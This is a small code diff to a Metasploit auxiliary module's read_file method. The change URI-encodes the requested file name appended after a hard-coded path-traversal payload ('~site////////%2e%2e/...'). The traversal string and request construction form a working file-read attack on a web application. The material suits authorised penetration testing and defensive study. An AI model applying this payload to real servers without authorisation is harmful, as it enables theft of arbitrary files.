@@ -134,7 +134,8 @@ class MetasploitModule < Msf::Auxiliary
   def read_file(project_name, target_file)
     path_traversal = '~site////////%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e'
     payload_path = normalize_uri(target_uri.path, project_name)
-    payload_path = "#{payload_path}/#{path_traversal}#{target_file}"
+    # Keep the traversal's percent escapes intact when encoding the requested file path.
+    payload_path = "#{payload_path}/#{path_traversal}#{Rex::Text.uri_encode(target_file)}"
 
     res = send_request_cgi({
       'method' => 'GET',
